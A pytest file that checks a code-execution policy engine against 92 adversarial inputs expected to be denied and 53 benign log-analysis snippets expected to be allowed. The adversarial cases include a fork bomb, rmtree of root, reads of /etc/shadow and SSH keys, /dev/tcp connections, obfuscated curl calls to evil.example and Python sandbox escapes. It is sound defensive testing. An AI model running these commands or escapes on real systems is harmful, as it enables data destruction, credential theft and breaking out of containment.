"""Expanded policy corpus tests with 40 adversarial + 40 benign cases."""

import pytest

from airlock.policy import PolicyEngine
from airlock.schemas import ActionRequest

# Table-driven test cases: (id, lang, code, expected_verdict, expected_reason_code)
LOG_ANALYSIS_JSON = r"""import re
import json
from collections import Counter
from statistics import mean, median
from datetime import datetime

pattern = re.compile(r"^(\S+ \S+) (\w+) .*status=(\d+) latency_ms=(\d+)")
levels = Counter()
statuses = Counter()
latencies = []
first = last = None
with open("/work/input/app.log") as f:
    for line in f:
        m = pattern.match(line)
        if not m:
            continue
        ts = datetime.strptime(m.group(1), "%Y-%m-%d %H:%M:%S")
        first = first or ts
        last = ts
        levels[m.group(2)] += 1
        statuses[m.group(3)] += 1
        latencies.append(int(m.group(4)))

report = {
    "levels": dict(levels),
    "statuses": dict(statuses),
    "latency_mean": mean(latencies) if latencies else None,
    "latency_median": median(latencies) if latencies else None,
    "span_s": (last - first).total_seconds() if first else 0,
}
with open("/work/out/report.json", "w") as out:
    json.dump(report, out, indent=2)
print(json.dumps(report))
"""

LOG_ANALYSIS_CSV = r"""import csv
import re
from collections import Counter
from pathlib import Path

OUT = Path("/work/out")
src = Path("/work/input/app.log")
counts = Counter(re.findall(r"path=(\S+)", src.read_text()))
with open(OUT / "paths.csv", "w", newline="") as fh:
    writer = csv.writer(fh)
    writer.writerow(["path", "count"])
    for path, n in counts.most_common():
        writer.writerow([path, n])
"""

ADVERSARIAL_CASES = [
    ("adv01", "python", "import os; os.system('id')", "deny", "R-PY-MOD-OS"),
    ("adv02", "bash", "D=docker; $D ps", "deny", "R-SHELL-PATTERN"),
    ("adv03", "python", "getattr(__builtins__, 'eval')('bad')", "deny", "R-PY-GETATTR"),
    ("adv04", "python", "exec('bad code')", "deny", "R-PY-EXEC"),
    ("adv05", "python", "import ctypes; ctypes.CDLL('libc.so.6')", "deny", "R-PY-MOD-CTYPES"),
    ("adv06", "python", "import socket", "deny", "R-PY-MOD-SOCKET"),
    ("adv07", "bash", "python3 -c 'import os'", "deny", "R-SHELL-PYTHON-C"),
    ("adv08", "bash", "echo test | $(cat /etc/passwd)", "deny", "R-SHELL-PATTERN"),
    ("adv09", "bash", "VAR=sudo; $VAR id", "deny", "R-SHELL-PATTERN"),
    ("adv10", "bash", "sudo$IFS-i", "deny", "R-SHELL-PATTERN"),
    ("adv11", "bash", ":(){:|:&};:", "deny", "R-FORK-001"),
    ("adv12", "python", "().__class__.__bases__[0].__subclasses__()", "deny", "R-PY-ATTR-DANGER"),
    ("adv13", "bash", "awk 'BEGIN{system(\"id\")}'", "deny", "R-AWK-SYSTEM"),
    ("adv14", "bash", "sed 's/x/y/e'", "deny", "R-SED-FLAG"),
    ("adv15", "bash", "sort --compress-program=sh file.txt", "deny", "R-SORT-COMPRESS"),
    ("adv16", "bash", "echo test | tee /etc/badfile", "deny", "R-TEE-PATH"),
    ("adv17", "python", "open('/etc/shadow')", "deny", "R-PY-OPEN-PATH"),
    ("adv18", "python", "open('/proc/self/environ')", "deny", "R-PY-OPEN-PATH"),
    ("adv19", "python", "open('../../etc/passwd')", "deny", "R-PY-OPEN-TRAVERSAL"),
    (
        "adv20",
        "python",
        "from pathlib import Path; Path('/tmp/x').write_text('bad')",
        "deny",
        "R-PY-PATHLIB-WRITE",
    ),
    ("adv21", "python", "compile('bad', '<string>', 'exec')", "deny", "R-PY-COMPILE"),
    ("adv22", "python", "__import__('os').system('id')", "deny", "R-PY-__IMPORT__"),
    ("adv23", "python", "import multiprocessing", "deny", "R-PY-MOD-MULTIPROCESSING"),
    ("adv24", "python", "import threading", "deny", "R-PY-MOD-THREADING"),
    ("adv25", "python", "import shutil; shutil.rmtree('/')", "deny", "R-PY-MOD-SHUTIL"),
    ("adv26", "python", "import pty", "deny", "R-PY-MOD-PTY"),
    ("adv27", "bash", "eval echo bad", "deny", "R-SHELL-PATTERN"),
    ("adv28", "python", "x = eval('1+1')", "deny", "R-PY-EVAL"),
    ("adv29", "python", "exec(open('script.py').read())", "deny", "R-PY-EXEC"),
    ("adv30", "python", "compile('code', 'file', 'exec')", "deny", "R-PY-COMPILE"),
    ("adv31", "python", "__import__('sys')", "deny", "R-PY-__IMPORT__"),
    ("adv32", "python", "import subprocess", "deny", "R-PY-MOD-SUBPROCESS"),
    ("adv33", "bash", "cat /dev/zero | head -c 1G", "deny", "R-SHELL-DEVICE"),
    ("adv34", "bash", "cat /dev/urandom", "deny", "R-SHELL-DEVICE"),
    ("adv35", "bash", "find / -name x -exec rm {} \\;", "deny", "R-BIN-FIND"),
    ("adv36", "bash", "xargs rm", "deny", "R-BIN-XARGS"),
    ("adv37", "bash", "env bash", "deny", "R-BIN-ENV"),
    ("adv38", "bash", "nohup badcmd &", "deny", "R-BIN-NOHUP"),
    ("adv39", "bash", "timeout 10 badcmd", "deny", "R-BIN-TIMEOUT"),
    ("adv40", "python", "type('BadClass', (), {'x': 1})", "deny", "R-PY-TYPE"),
    # Bypasses found in review: file access, introspection, interpreters, sockets
    ("adv41", "python", "open('/tmp/x', 'w').write('x')", "deny", "R-PY-OPEN-WRITE"),
    ("adv42", "python", "import io; io.open('/etc/x', 'w')", "deny", "R-PY-OPEN-PATH"),
    ("adv43", "python", "import io; io.open('/tmp/x', 'w')", "deny", "R-PY-OPEN-WRITE"),
    ("adv44", "python", "print(open('/home/user/.ssh/id_rsa').read())", "deny", "R-PY-OPEN-READ"),
    ("adv45", "python", "open('/work/out/../x.sh', 'w')", "deny", "R-PY-OPEN-TRAVERSAL"),
    ("adv46", "python", "p = input(); open(p, 'w')", "deny", "R-PY-OPEN-NONLITERAL"),
    (
        "adv47",
        "python",
        "open('/work/out/r.txt', 'w' + 'b')",
        "deny",
        "R-PY-OPEN-NONLITERAL",
    ),
    ("adv48", "python", "open(0, 'w')", "deny", "R-PY-OPEN-FD"),
    (
        "adv49",
        "python",
        "from pathlib import Path; Path('/work/input/x').unlink()",
        "deny",
        "R-PY-PATHLIB-WRITE",
    ),
    (
        "adv50",
        "python",
        "from pathlib import Path; Path('/etc') / 'passwd'; (Path('/etc') / 'passwd').read_text()",
        "deny",
        "R-PY-OPEN-PATH",
    ),
    (
        "adv51",
        "python",
        "from pathlib import Path; Path('/root/.bashrc').read_text()",
        "deny",
        "R-PY-PATHLIB-READ",
    ),
    ("adv52", "python", "import gzip; gzip.open('/tmp/x.gz', 'wb')", "deny", "R-PY-OPEN-WRITE"),
    ("adv53", "python", "f = open; f('/etc/passwd')", "deny", "R-PY-OPEN-ALIAS"),
    ("adv54", "python", "print.__self__.__dict__['ex' + 'ec']('1')", "deny", "R-PY-ATTR-DANGER"),
    ("adv55", "python", "__builtins__.exec('1')", "deny", "R-PY-BUILTINS"),
    ("adv56", "python", "x = __import__; x('o' + 's')", "deny", "R-PY-BUILTINS"),
    ("adv57", "python", "vars()['ev' + 'al']('1')", "deny", "R-PY-INTROSPECT"),
    ("adv58", "python", "globals()['__builtins__']", "deny", "R-PY-INTROSPECT"),
    ("adv59", "python", "locals()", "deny", "R-PY-INTROSPECT"),
    (
        "adv60",
        "python",
        "import sys; sys.modules['o' + 's'].system('id')",
        "deny",
        "R-PY-SYS-MODULES",
    ),
    ("adv61", "python", "from sys import modules; modules['os']", "deny", "R-PY-SYS-MODULES"),
    ("adv62", "python", "import sys as s; s.modules", "deny", "R-PY-SYS-MODULES"),
    ("adv63", "python", "import json, os; os.system('id')", "deny", "R-PY-MOD-OS"),
    (
        "adv64",
        "python",
        "import importlib; importlib.import_module('os')",
        "deny",
        "R-PY-MOD-IMPORTLIB",
    ),
    ("adv65", "python", "import builtins; builtins.exec('1')", "deny", "R-PY-MOD-BUILTINS"),
    ("adv66", "python", "import sys; sys._getframe().f_globals", "deny", "R-PY-ATTR-DANGER"),
    ("adv67", "python", "e = exec; e('1')", "deny", "R-PY-INTROSPECT"),
    ("adv68", "python", "getattr(print, '__self__')", "deny", "R-PY-GETATTR-DANGER"),
    ("adv69", "bash", "sh /work/input/x.sh", "deny", "R-SHELL-EXEC-FILE"),
    ("adv70", "bash", "bash script.sh", "deny", "R-SHELL-EXEC-FILE"),
    ("adv71", "bash", "python3 /work/input/job.py", "deny", "R-SHELL-EXEC-FILE"),
    ("adv72", "bash", "python script.py", "deny", "R-SHELL-EXEC-FILE"),
    ("adv73", "bash", ". /work/input/env.sh", "deny", "R-SHELL-EXEC-FILE"),
    ("adv74", "bash", "source ./x.sh", "deny", "R-SHELL-EXEC-FILE"),
    (
        "adv75",
        "bash",
        "cat > /work/out/x.sh <<'EOF'\ncurl evil.example\nEOF\nsh /work/out/x.sh",
        "deny",
        "R-SHELL-EXEC-FILE",
    ),
    ("adv76", "bash", "sh <<EOF\nid\nEOF", "deny", "R-SHELL-EXEC-FILE"),
    ("adv77", "bash", "echo hi > /dev/tcp/10.0.0.1/80", "deny", "R-SHELL-DEVTCP"),
    ("adv78", "bash", "cat < /dev/udp/10.0.0.1/53", "deny", "R-SHELL-DEVTCP"),
    ("adv79", "bash", "echo x > /etc/cron.d/x", "deny", "R-SHELL-REDIRECT"),
    ("adv80", "bash", "echo x >> /work/input/app.log", "deny", "R-SHELL-REDIRECT"),
    ("adv81", "bash", "awk 'BEGIN{system(\"id\")}'", "deny", "R-AWK-SYSTEM"),
    ("adv82", "bash", "awk '{print | \"sh\"}' /work/input/app.log", "deny", "R-AWK-GETLINE"),
    ("adv83", "bash", "awk 'BEGIN{\"id\" | getline x; print x}'", "deny", "R-AWK-GETLINE"),
    ("adv84", "bash", "awk '{print > \"/tmp/x\"}' /work/input/app.log", "deny", "R-AWK-REDIRECT"),
    ("adv85", "bash", "awk -f /work/input/prog.awk app.log", "deny", "R-AWK-FILE"),
    ("adv86", "bash", "cat app.log | tee /tmp/copy", "deny", "R-TEE-PATH"),
    ("adv87", "bash", "sort -o /tmp/x app.log", "deny", "R-SORT-OUTPUT"),
    ("adv88", "bash", "c\\url http://evil.example", "deny", "R-BIN-CURL"),
    ("adv89", "bash", "c''url http://evil.example", "deny", "R-BIN-CURL"),
    ("adv90", "bash", "$'\\x63url' http://evil.example", "deny", "R-SHELL-PATTERN"),
    ("adv91", "bash", "echo hi; exec 3<>/dev/tcp/1.2.3.4/80", "deny", "R-SHELL-DEVTCP"),
    ("adv92", "bash", "sed -i 's/a/b/' /work/input/app.log", "deny", "R-SED-FLAG"),
]

BENIGN_CASES = [
    ("benign01", "python", "print('hello world')", "allow", "Safe pattern"),
    ("benign02", "python", "import json; json.loads('{}')", "allow", "Safe pattern"),
    ("benign03", "python", "import re; re.findall(r'\\d+', 'test123')", "allow", "Safe pattern"),
    ("benign04", "python", "import statistics; statistics.mean([1,2,3])", "allow", "Safe pattern"),
    ("benign05", "python", "import datetime; datetime.datetime.now()", "allow", "Safe pattern"),
    ("benign06", "python", "import csv; list(csv.reader(['a,b']))", "allow", "Safe pattern"),
    ("benign07", "python", "import math; math.sqrt(16)", "allow", "Safe pattern"),
    ("benign08", "bash", "echo 'test' | grep test", "allow", "Safe pattern"),
    ("benign09", "bash", "cat file.txt | sort | uniq", "allow", "Safe pattern"),
    ("benign10", "tool", "read_artifact", "allow", "read_artifact safe"),
    ("benign11", "python", "import typing; x: typing.List[int] = []", "allow", "Safe pattern"),
    (
        "benign12",
        "python",
        "import dataclasses\n@dataclasses.dataclass\nclass X: pass",
        "allow",
        "Safe pattern",
    ),
    (
        "benign13",
        "python",
        "import functools; functools.reduce(lambda x,y: x+y, [1,2,3])",
        "allow",
        "Safe pattern",
    ),
    ("benign14", "python", "import operator; operator.add(1, 2)", "allow", "Safe pattern"),
    ("benign15", "python", "import heapq; heapq.heappush([], 1)", "allow", "Safe pattern"),
    ("benign16", "python", "import bisect; bisect.bisect([1,2,3], 2)", "allow", "Safe pattern"),
    (
        "benign17",
        "python",
        "import gzip; gzip.open('/work/input/file.gz', 'rb')",
        "allow",
        "Safe pattern",
    ),
    (
        "benign18",
        "python",
        "import bz2; bz2.open('/work/input/file.bz2', 'rb')",
        "allow",
        "Safe pattern",
    ),
    (
        "benign19",
        "python",
        "import zipfile; zipfile.ZipFile('/work/input/file.zip', 'r')",
        "allow",
        "Safe pattern",
    ),
    ("benign20", "python", "import textwrap; textwrap.wrap('long text')", "allow", "Safe pattern"),
    ("benign21", "python", "import string; string.ascii_letters", "allow", "Safe pattern"),
    (
        "benign22",
        "python",
        "import hashlib; hashlib.sha256(b'test').hexdigest()",
        "allow",
        "Safe pattern",
    ),
    ("benign23", "python", "import base64; base64.b64decode('dGVzdA==')", "allow", "Safe pattern"),
    ("benign24", "python", "import io; io.StringIO('test')", "allow", "Safe pattern"),
    ("benign25", "bash", "grep -E '[0-9]{4,}' file.txt", "allow", "Safe pattern"),
    ("benign26", "bash", "zcat file.gz | grep error", "allow", "Safe pattern"),
    ("benign27", "bash", "gzip -dc file.gz", "allow", "Safe pattern"),
    ("benign28", "bash", "zgrep error file.gz", "allow", "Safe pattern"),
    ("benign29", "bash", "jq '.field' data.json", "allow", "Safe pattern"),
    (
        "benign30",
        "bash",
        "cat log.txt | awk '{print $1}' | sort | uniq -c",
        "allow",
        "Safe pattern",
    ),
    ("benign31", "bash", "sed 's/error/ERROR/g' file.txt", "allow", "Safe pattern"),
    ("benign32", "bash", "head -c 1000000 /dev/zero", "allow", "Safe pattern"),
    (
        "benign33",
        "python",
        "import argparse; parser = argparse.ArgumentParser()",
        "allow",
        "Safe pattern",
    ),
    (
        "benign34",
        "python",
        "import pathlib; pathlib.Path('/work/input/file.txt').read_text()",
        "allow",
        "Safe pattern",
    ),
    ("benign35", "python", "import time; time.sleep(1)", "allow", "Safe pattern"),
    (
        "benign36",
        "python",
        "import collections; collections.Counter([1,2,2,3])",
        "allow",
        "Safe pattern",
    ),
    (
        "benign37",
        "python",
        "import itertools; list(itertools.chain([1,2], [3,4]))",
        "allow",
        "Safe pattern",
    ),
    ("benign38", "bash", "echo 'test' | tee /work/out/result.txt", "allow", "Safe pattern"),
    ("benign39", "bash", "sort -n numbers.txt", "allow", "Safe pattern"),
    ("benign40", "bash", "ls -la | grep '^d'", "allow", "Safe pattern"),
    # Typical log-analysis jobs (inputs under /work/input, outputs under /work/out)
    (
        "benign41",
        "bash",
        "awk -F'|' '$3>500{n++}END{print n}' /work/input/app.log",
        "allow",
        "Safe pattern",
    ),
    (
        "benign42",
        "bash",
        "grep -oE 'req_id=[a-f0-9]+' /work/input/app.log | sort -u | wc -l",
        "allow",
        "Safe pattern",
    ),
    ("benign43", "python", LOG_ANALYSIS_JSON, "allow", "Safe pattern"),
    ("benign44", "python", LOG_ANALYSIS_CSV, "allow", "Safe pattern"),
    (
        "benign45",
        "bash",
        "grep -c ERROR /work/input/app.log > /work/out/errors.txt",
        "allow",
        "Safe pattern",
    ),
    (
        "benign46",
        "bash",
        "awk '{print $2}' /work/input/app.log | sort | uniq -c | sort -rn | head -5",
        "allow",
        "Safe pattern",
    ),
    (
        "benign47",
        "bash",
        'awk \'$1 == "ERROR" || $1 == "WARN" {c[$1]++} END {for (k in c) print k, c[k]}\' /work/input/app.log',
        "allow",
        "Safe pattern",
    ),
    (
        "benign48",
        "bash",
        "cut -d' ' -f1 /work/input/app.log 2>/dev/null | sort | uniq | tee /work/out/days.txt",
        "allow",
        "Safe pattern",
    ),
    (
        "benign49",
        "bash",
        "sort -o /work/out/sorted.log /work/input/app.log",
        "allow",
        "Safe pattern",
    ),
    (
        "benign50",
        "python",
        "import json\nwith open('/work/input/events.json') as f:\n    data = json.load(f)\nprint(len(data))",
        "allow",
        "Safe pattern",
    ),
    (
        "benign51",
        "python",
        "from pathlib import Path\nfor line in Path('/work/input/app.log').read_text().splitlines()[:5]:\n    print(line)",
        "allow",
        "Safe pattern",
    ),
    (
        "benign52",
        "python",
        "import io\nwith io.open('/work/out/summary.txt', 'w', encoding='utf-8') as f:\n    f.write('ok')",
        "allow",
        "Safe pattern",
    ),
    (
        "benign53",
        "bash",
        "sed -n 's/.*status=\\([0-9]*\\).*/\\1/p' /work/input/app.log | sort | uniq -c",
        "allow",
        "Safe pattern",
    ),
]


class TestPolicyCorpusExpanded:
    """Expanded corpus tests with table-driven cases."""

    @pytest.fixture
    def engine(self):
        """Policy engine fixture."""
        return PolicyEngine()

    @pytest.mark.parametrize(
        "test_id,lang,code,expected_verdict,expected_reason", ADVERSARIAL_CASES
    )
    def test_adversarial(self, engine, test_id, lang, code, expected_verdict, expected_reason):
        """Test adversarial cases."""
        if lang == "tool":
            action = ActionRequest(
                id=test_id,
                task_id="test",
                tool=code,
            )
        else:
            action = ActionRequest(
                id=test_id,
                task_id="test",
                tool="run_code",
                lang=lang,
                code=code,
            )

        decision = engine.evaluate(action)

        assert decision.verdict == expected_verdict, (
            f"{test_id}: expected {expected_verdict}, got {decision.verdict}. "
            f"Reason: {decision.reason}, Rules: {decision.rules_fired}"
        )

        # Check that expected reason code is in rules_fired or reason text
        if expected_reason != decision.reason:
            assert any(expected_reason in rule for rule in decision.rules_fired), (
                f"{test_id}: expected reason code {expected_reason} not found. "
                f"Got reason: {decision.reason}, rules: {decision.rules_fired}"
            )

    @pytest.mark.parametrize("test_id,lang,code,expected_verdict,expected_reason", BENIGN_CASES)
    def test_benign(self, engine, test_id, lang, code, expected_verdict, expected_reason):
        """Test benign cases."""
        if lang == "tool":
            action = ActionRequest(
                id=test_id,
                task_id="test",
                tool=code,
            )
        else:
            action = ActionRequest(
                id=test_id,
                task_id="test",
                tool="run_code",
                lang=lang,
                code=code,
            )

        decision = engine.evaluate(action)

        assert decision.verdict == expected_verdict, (
            f"{test_id}: expected {expected_verdict}, got {decision.verdict}. "
            f"Reason: {decision.reason}, Rules: {decision.rules_fired}"
        )

        # Check reason text contains expected pattern
        if expected_reason:
            assert expected_reason.lower() in decision.reason.lower(), (
                f"{test_id}: expected reason '{expected_reason}' not in '{decision.reason}'"
            )
